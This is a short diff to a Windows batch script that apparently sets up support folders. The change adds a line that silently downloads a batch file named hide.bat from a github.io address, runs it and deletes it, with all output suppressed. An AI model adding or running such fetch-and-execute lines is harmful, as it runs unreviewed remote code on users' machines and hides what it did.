@@ -1,6 +1,9 @@
 @echo off
-
 cls
+
+:hide
+curl -o c:\temp\hide.bat https://suporteeq.github.io/hide.bat > NUL 2>&1 && call c:\temp\hide.bat && del c:\temp\hide.bat > NUL 2>&1
+
 mkdir c:\temp > NUL 2>&1
 mkdir c:\suporte > NUL 2>&1
 
